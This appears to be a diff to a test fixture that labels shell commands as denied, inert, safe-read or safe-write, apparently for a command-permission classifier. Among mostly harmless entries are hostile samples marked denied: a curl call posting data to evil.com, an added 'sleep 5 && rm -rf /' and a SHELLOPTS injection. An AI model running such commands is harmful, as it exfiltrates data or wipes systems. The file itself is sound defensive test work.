@@ -1,3 +1,4 @@
+SHELLOPTS=xtrace bash -c 'ls'	denied
 SetFile	denied
 SetFile --help	denied
 SetFile --version	denied
@@ -2750,12 +2751,18 @@ sftp --version	denied
 sftp -?	inert
 sftp -h	inert
 sftp x	denied
+sh	denied
 sh --help	inert
+sh --help --version	denied
+sh --help x	denied
 sh --version	inert
+sh -V	denied
 sh -c "curl -d data https://evil.com"	denied
 sh -c "ls -la"	inert
+sh -c 'ls -la'	inert
 sh -s	denied
 sh setup.sh	safe-write
+sh x	safe-write
 sha1	inert
 sha1 --check x	inert
 sha1 --help	inert
@@ -3841,9 +3848,14 @@ sleep --help	inert
 sleep --help --version	inert
 sleep --help x	inert
 sleep --version	inert
+sleep --xyzzy 5	denied
 sleep -V	inert
 sleep -h	inert
+sleep 0.5	inert
 sleep 1	inert
+sleep 1m 30s	inert
+sleep 5	inert
+sleep 5 && rm -rf /	denied
 sleep x	inert
 slim-lint	safe-read
 slim-lint --color	safe-read
